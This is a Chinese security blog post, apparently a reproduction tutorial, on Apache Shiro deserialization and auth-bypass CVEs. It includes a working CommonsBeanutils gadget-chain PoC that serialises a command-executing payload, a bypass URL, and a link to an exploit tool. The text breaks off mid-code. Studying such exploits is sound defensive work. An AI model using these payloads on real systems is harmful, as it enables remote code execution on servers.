@@ -1,0 +1,759 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/gc.jpg">
+  <link rel="icon" href="/img/gc.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="fru1ts">
+  <meta name="keywords" content="fru1ts">
+  
+    <meta name="description" content="对shiro反序列化做一个复现  CVE-2016-4437(Shiro-550)  影响版本 Apache Shiro&lt;&#x3D;1.2.4  漏洞原理 Apacha shiro 提供了remember的功能，当用户登录并选择remember时下次登录就是通过cookie进行认证。 shiro的认证机制是将接收到的cookie 进行base64解码，然后通过AES解码，最后进行反序列化。 而在Ap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shiro反序列化">
+<meta property="og:url" content="https://fru1ts.github.io/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="fru1ts&#39; Blog">
+<meta property="og:description" content="对shiro反序列化做一个复现  CVE-2016-4437(Shiro-550)  影响版本 Apache Shiro&lt;&#x3D;1.2.4  漏洞原理 Apacha shiro 提供了remember的功能，当用户登录并选择remember时下次登录就是通过cookie进行认证。 shiro的认证机制是将接收到的cookie 进行base64解码，然后通过AES解码，最后进行反序列化。 而在Ap">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://fru1ts.github.io/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.jpg">
+<meta property="og:image" content="https://fru1ts.github.io/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.jpg">
+<meta property="og:image" content="https://fru1ts.github.io/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.jpg">
+<meta property="og:image" content="https://fru1ts.github.io/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png">
+<meta property="og:image" content="https://fru1ts.github.io/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.jpg">
+<meta property="article:published_time" content="2024-09-05T18:57:51.000Z">
+<meta property="article:modified_time" content="2024-09-27T11:26:50.602Z">
+<meta property="article:author" content="fru1ts">
+<meta property="article:tag" content="JAVA">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://fru1ts.github.io/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.jpg">
+  
+  
+  
+  <title>shiro反序列化 - fru1ts&#39; Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/KaTeX/0.16.2/katex.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/mouse.css">
+<link rel="stylesheet" href="/css/scroll.css">
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"fru1ts.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"WEdmoCOkNdSUMsONpu72ngCo-gzGzoHsz","app_key":"PSBkctB8cKrR97yZLNXnJ0nj","server_url":"https://wedmocok.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.11.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>fru1ts&#39; Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="shiro反序列化"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-05 18:57" pubdate>
+          September 5, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.9k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          67 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> views
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">shiro反序列化</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    Last updated on September 27, 2024 am
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>对shiro反序列化做一个复现</p>
+<h2 id="cve-2016-4437shiro-550"><a class="markdownIt-Anchor" href="#cve-2016-4437shiro-550"></a> CVE-2016-4437(Shiro-550)</h2>
+<h3 id="影响版本"><a class="markdownIt-Anchor" href="#影响版本"></a> 影响版本</h3>
+<p>Apache Shiro&lt;=1.2.4</p>
+<h3 id="漏洞原理"><a class="markdownIt-Anchor" href="#漏洞原理"></a> 漏洞原理</h3>
+<p>Apacha shiro 提供了remember的功能，当用户登录并选择remember时下次登录就是通过cookie进行认证。</p>
+<p>shiro的认证机制是将接收到的cookie 进行base64解码，然后通过AES解码，最后进行反序列化。</p>
+<p>而在Apache Shiro&lt;=1.2.4，AES的加解密密钥是<strong>硬编码</strong>在代码中，如果攻击者通过泄露或者爆破得到密钥，则可以伪造Remember的值。也就是先构造能够触发命令执行的序列化，然后AES加密，base64编码得到remember，然后以remember=这个值去访问服务端就会触发反序列化漏洞。</p>
+<p>比如打CC链，需要有引入CommonsCollections组件</p>
+<h2 id="cve-2019-12422shiro-721"><a class="markdownIt-Anchor" href="#cve-2019-12422shiro-721"></a> CVE-2019-12422(Shiro-721)</h2>
+<h3 id="影响版本-2"><a class="markdownIt-Anchor" href="#影响版本-2"></a> 影响版本</h3>
+<p>1.2.5,<br />
+1.2.6,<br />
+1.3.0,<br />
+1.3.1,<br />
+1.3.2,<br />
+1.4.0-RC2,<br />
+1.4.0,<br />
+1.4.1</p>
+<h3 id="漏洞原理-2"><a class="markdownIt-Anchor" href="#漏洞原理-2"></a> 漏洞原理</h3>
+<p>相较于Shiro-550，Shiro-721的AES加密是AES-CBC，key是系统动态生成的，所以是猜不到的。</p>
+<p>Padding Oracle Attack攻击可以实现破解AES-CBC加密过程进而实现rememberMe的内容伪造。（<strong>需要提供一个正常用户Cookie中的remember值</strong>）</p>
+<p>上面两个CVE的利用工具</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/feihong-cs/ShiroExploit-Deprecated/">GitHub - feihong-cs/ShiroExploit-Deprecated: Shiro550/Shiro721 一键化利用工具，支持多种回显方式</a></p>
+<h2 id="cve-2020-1957"><a class="markdownIt-Anchor" href="#cve-2020-1957"></a> CVE-2020-1957</h2>
+<h3 id="影响版本-3"><a class="markdownIt-Anchor" href="#影响版本-3"></a> 影响版本</h3>
+<p>Apache Shiro &lt; 1.5.1</p>
+<h3 id="漏洞原理-3"><a class="markdownIt-Anchor" href="#漏洞原理-3"></a> 漏洞原理</h3>
+<p>这个是一个鉴权漏洞。</p>
+<p>Spring Boot中使用 Apache Shiro 进行身份验证、权限控制时，可以精心构造恶意的URL，利用 Apache Shiro 和 Spring Boot 对URL的处理的差异化，可以绕过 Apache Shiro 对 Spring Boot 中的 Servlet 的权限控制，越权并实现未授权访问。</p>
+<h3 id="poc"><a class="markdownIt-Anchor" href="#poc"></a> POC</h3>
+<p>构造恶意请求<code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面。</p>
+<h2 id="commons-collectionscommon-beanutils链利用"><a class="markdownIt-Anchor" href="#commons-collectionscommon-beanutils链利用"></a> commons-collections+common-beanutils链利用</h2>
+<p>利用链</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">PriorityQueue</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:readObject-&gt;PriorityQueue</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:heapify-&gt;PriorityQueue</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:siftDown-&gt;PriorityQueue</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:siftDownUsingComparator-&gt;BeanComparator</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:compare-&gt;PropertyUtils</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:getProperty-&gt;PropertyUtilsBean</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:getProperty-&gt;PropertyUtilsBean</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:-&gt;getSimpleProperty-&gt;TemplatesImpl</span>链<br></code></pre></td></tr></table></figure>
+<h3 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h3>
+<img src="/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>无参实例化时，会使用<code>this()</code> 关键字用于调用当前类的另一个构造函数，所以会调用<code>BeanComparator(String property)</code></p>
+<p><code>BeanComparator(String property)</code>中使用了<code>ComparableComparator</code>。使用<code>ComparableComparator</code>需要引入<code>commons-collections</code>。</p>
+<p>在<code>BeanComparator::compare</code>,</p>
+<img src="/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>调用了<code>PropertyUtils.getProperty</code>参数可控，</p>
+<img src="/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>调用了<code>PropertyUtilsBean.getProperty</code>，然后调用<code>getNestedProperty</code>，再调用<code>getSimpleProperty</code></p>
+<img src="/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" srcset="/img/loading.gif" lazyload class="">
+<p>可以设置要调用的getter方法，这里设置为调用<code>TemplatesImpl</code>的<code>getOutputProperties</code></p>
+<h3 id="poc-2"><a class="markdownIt-Anchor" href="#poc-2"></a> POC</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsBeanutils1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object</span><br><span class="hljs-params">            value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(Object obj, String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> field.get(obj);<br>        <span class="hljs-keyword">return</span> value;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//恶意Templates</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;Cat&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        cc.makeClassInitializer().insertBefore(cmd);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">randomClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Calc&quot;</span> + System.nanoTime();<br>        cc.setName(randomClassName);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;cc.toBytecode()&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,beanComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        setFieldValue(beanComparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>); <span class="hljs-comment">//要调用的getter</span><br>        setFieldValue(priorityQueue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./CommonsBeanutils.ser&quot;</span>));<br>        outputStream.writeObject(priorityQueue);<br>        outputStream.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./CommonsBeanutils.ser&quot;</span>));<br>        inputStream.readObject();<br>        inputStream.close();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml">      <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-spring<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="commonsbeanutils链利用"><a class="markdownIt-Anchor" href="#commonsbeanutils链利用"></a> CommonsBeanutils链利用</h2>
+<p>CB链不需要依赖其他组件，shiro自身带了CommonsBeanutils组件，自身就可以完成利用。</p>
+<h3 id="分析-2"><a class="markdownIt-Anchor" href="#分析-2"></a> 分析</h3>
+<p>由于<code>ComparableComparator</code>是<code>commons-collections</code>中的，所以要不想依赖CC就不能用到<code>commons-collections</code></p>
+<p>在<code>BeanComparator</code>的构造函数中，可以通过传递两个参数（String,Comparator）来避免使用<code>commons-collections</code></p>
+<img src="/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>p神已经找到了可以传的<code>Comparator</code>:<code>String.CASE_INSENSITIVE_ORDER</code>，所以构造时用</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">BeanComparator beanComparator = <span class="hljs-keyword">new</span> <span class="hljs-type">BeanComparator</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">String</span>.CASE_INSENSITIVE_ORDER);<br></code></pre></td></tr></table></figure>
+<p>而<code>PriorityQueue::add</code>当添加第二个时会调用到<code>String.CASE_INSENSITIVE_ORDER</code>的<code>compare</code></p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(<span class="hljs-type">String</span> s1, <span class="hljs-type">String</span> s2)</span> </span><br></code></pre></td></tr></table></figure>
+<p>参数要求是String，所以add的时候要改成String类型。</p>
+<h3 id="poc-3"><a class="markdownIt-Anchor" href="#poc-3"></a> POC</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsBeanutils1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object</span><br><span class="hljs-params">            value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> 